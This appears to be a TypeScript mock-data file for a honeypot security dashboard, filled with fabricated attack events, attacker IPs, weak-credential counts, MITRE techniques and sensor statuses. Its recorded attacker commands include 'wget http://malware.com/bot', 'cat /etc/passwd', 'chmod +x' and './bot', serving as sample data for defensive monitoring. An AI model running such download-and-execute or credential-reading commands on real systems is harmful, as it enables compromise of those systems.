import {
  ThreatEvent,
  AttackerInfo,
  AttackTimelineData,
  AttackTypeBreakdown,
  ServiceData,
  CredentialData,
  AttackerBehavior,
  FingerprintData,
  MitreTechnique,
  SensorHealth
} from '@/types/honeypot';

export const mockLiveEvents: ThreatEvent[] = [
  { id: 'evt-001', timestamp: new Date(Date.now() - 5000).toISOString(), sensor: 'Cowrie-01', protocol: 'SSH', sourceIp: '192.168.1.100', eventType: 'Brute Force', payloadPreview: 'root:123456', severity: 'High' },
  { id: 'evt-002', timestamp: new Date(Date.now() - 15000).toISOString(), sensor: 'Dionaea-02', protocol: 'SMB', sourceIp: '10.0.0.45', eventType: 'Enumeration', payloadPreview: 'IPC$ Connection', severity: 'Medium' },
  { id: 'evt-003', timestamp: new Date(Date.now() - 22000).toISOString(), sensor: 'Snort-Edge', protocol: 'HTTP', sourceIp: '45.33.22.11', eventType: 'Web Probe', payloadPreview: 'GET /.env', severity: 'Critical' },
  { id: 'evt-004', timestamp: new Date(Date.now() - 35000).toISOString(), sensor: 'Cowrie-01', protocol: 'SSH', sourceIp: '192.168.1.100', eventType: 'Command Execution', payloadPreview: 'wget http://malware.com/bot', severity: 'Critical' },
  { id: 'evt-005', timestamp: new Date(Date.now() - 40000).toISOString(), sensor: 'OpenCanary-01', protocol: 'FTP', sourceIp: '188.166.44.22', eventType: 'Login Attempt', payloadPreview: 'admin:admin', severity: 'Low' },
];

export const mockAttackers: AttackerInfo[] = [
  { ip: '192.168.1.100', country: 'Russia', asn: 'AS12345', attackCount: 1450, firstSeen: '2023-10-01', lastSeen: '2023-10-25', mainTechnique: 'SSH Brute Force', riskScore: 95, status: 'Critical', latitude: 61.5240, longitude: 105.3188 },
  { ip: '45.33.22.11', country: 'China', asn: 'AS9876', attackCount: 890, firstSeen: '2023-10-20', lastSeen: '2023-10-25', mainTechnique: 'Web Probing', riskScore: 78, status: 'High', latitude: 35.8617, longitude: 104.1954 },
  { ip: '10.0.0.45', country: 'Brazil', asn: 'AS4455', attackCount: 320, firstSeen: '2023-10-24', lastSeen: '2023-10-25', mainTechnique: 'SMB Enumeration', riskScore: 60, status: 'Medium', latitude: -14.2350, longitude: -51.9253 },
  { ip: '188.166.44.22', country: 'Netherlands', asn: 'AS2233', attackCount: 150, firstSeen: '2023-10-22', lastSeen: '2023-10-25', mainTechnique: 'FTP Login', riskScore: 30, status: 'Low', latitude: 52.1326, longitude: 5.2913 },
  { ip: '203.0.113.50', country: 'United States', asn: 'AS7788', attackCount: 2100, firstSeen: '2023-09-15', lastSeen: '2023-10-25', mainTechnique: 'Port Scanning', riskScore: 88, status: 'High', latitude: 37.0902, longitude: -95.7129 },
];

export const mockTimelineData: AttackTimelineData[] = [
  { time: '00:00', ssh: 120, telnet: 45, http: 80, ftp: 20, smb: 10, portScan: 150 },
  { time: '04:00', ssh: 150, telnet: 55, http: 90, ftp: 25, smb: 15, portScan: 200 },
  { time: '08:00', ssh: 300, telnet: 100, http: 250, ftp: 40, smb: 30, portScan: 450 },
  { time: '12:00', ssh: 450, telnet: 120, http: 350, ftp: 60, smb: 50, portScan: 600 },
  { time: '16:00', ssh: 380, telnet: 90, http: 280, ftp: 50, smb: 45, portScan: 550 },
  { time: '20:00', ssh: 250, telnet: 70, http: 180, ftp: 35, smb: 20, portScan: 300 },
];

export const mockAttackTypes: AttackTypeBreakdown[] = [
  { name: 'SSH Brute Force', value: 45, color: '#3b82f6' }, // blue-500
  { name: 'Web Probe', value: 25, color: '#10b981' }, // emerald-500
  { name: 'Port Scan', value: 15, color: '#8b5cf6' }, // violet-500
  { name: 'Telnet Login', value: 10, color: '#f59e0b' }, // amber-500
  { name: 'SMB Enum', value: 5, color: '#ef4444' }, // red-500
];

export const mockServices: ServiceData[] = [
  { name: 'SSH (22)', count: 8500 },
  { name: 'HTTP (80)', count: 6200 },
  { name: 'HTTPS (443)', count: 4100 },
  { name: 'Telnet (23)', count: 3200 },
  { name: 'SMB (445)', count: 1800 },
  { name: 'FTP (21)', count: 950 },
  { name: 'MySQL (3306)', count: 600 },
  { name: 'RDP (3389)', count: 450 },
];

export const mockUsernames: CredentialData[] = [
  { name: 'root', count: 15420 },
  { name: 'admin', count: 8350 },
  { name: 'user', count: 4100 },
  { name: 'test', count: 2800 },
  { name: 'ubuntu', count: 1950 },
  { name: 'oracle', count: 1200 },
];

export const mockPasswords: CredentialData[] = [
  { name: '123456', count: 18500 },
  { name: 'password', count: 12400 },
  { name: 'admin', count: 9600 },
  { name: 'root', count: 5200 },
  { name: '1234', count: 3800 },
  { name: 'qwerty', count: 2100 },
];

export const mockBehavior: AttackerBehavior = {
  avgSessionDuration: '45s',
  commandsPerSession: 8.5,
  topCommands: [
    { command: 'whoami', count: 1420 },
    { command: 'uname -a', count: 1150 },
    { command: 'cat /etc/passwd', count: 980 },
    { command: 'wget http://...', count: 750 },
    { command: 'chmod +x', count: 720 },
    { command: './bot', count: 680 },
  ],
  fileDownloads: 845,
  shellInteractions: 3240,
};

export const mockFingerprints: FingerprintData[] = [
  { type: 'JA3', value: '771,4865-4866-4867,0-11-10,23-24,0', count: 1250, risk: 'High' },
  { type: 'HASSH', value: '0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d', count: 890, risk: 'Critical' },
  { type: 'User-Agent', value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Nmap Scripting Engine', count: 4500, risk: 'Medium' },
  { type: 'JA3', value: '123,456-789,1-2,3,4', count: 320, risk: 'Low' },
];

export const mockMitre: MitreTechnique[] = [
  { id: 'T1595', name: 'Active Scanning', tactic: 'Reconnaissance', eventCount: 15420, severity: 'Medium' },
  { id: 'T1110', name: 'Brute Force', tactic: 'Credential Access', eventCount: 28500, severity: 'High' },
  { id: 'T1082', name: 'System Info Discovery', tactic: 'Discovery', eventCount: 4200, severity: 'Low' },
  { id: 'T1059', name: 'Command and Scripting', tactic: 'Execution', eventCount: 3800, severity: 'Critical' },
  { id: 'T1105', name: 'Ingress Tool Transfer', tactic: 'Command and Control', eventCount: 1250, severity: 'High' },
];

export const mockSensors: SensorHealth[] = [
  { name: 'Cowrie (SSH/Telnet)', status: 'Online', uptime: '99.9%', eventsProcessed: 145000, latency: '45ms', lastHeartbeat: '2s ago' },
  { name: 'Dionaea (SMB/FTP)', status: 'Online', uptime: '99.8%', eventsProcessed: 85000, latency: '60ms', lastHeartbeat: '5s ago' },
  { name: 'Snort (NIDS)', status: 'Online', uptime: '99.9%', eventsProcessed: 2500000, latency: '12ms', lastHeartbeat: '1s ago' },
  { name: 'Redis (Event Stream)', status: 'Online', uptime: '100%', eventsProcessed: 2730000, latency: '5ms', lastHeartbeat: '0s ago' },
  { name: 'Logstash (Pipeline)', status: 'Degraded', uptime: '98.5%', eventsProcessed: 2700000, latency: '450ms', lastHeartbeat: '15s ago' },
  { name: 'PostgreSQL (Storage)', status: 'Online', uptime: '99.9%', eventsProcessed: 2700000, latency: '25ms', lastHeartbeat: '1s ago' },
];
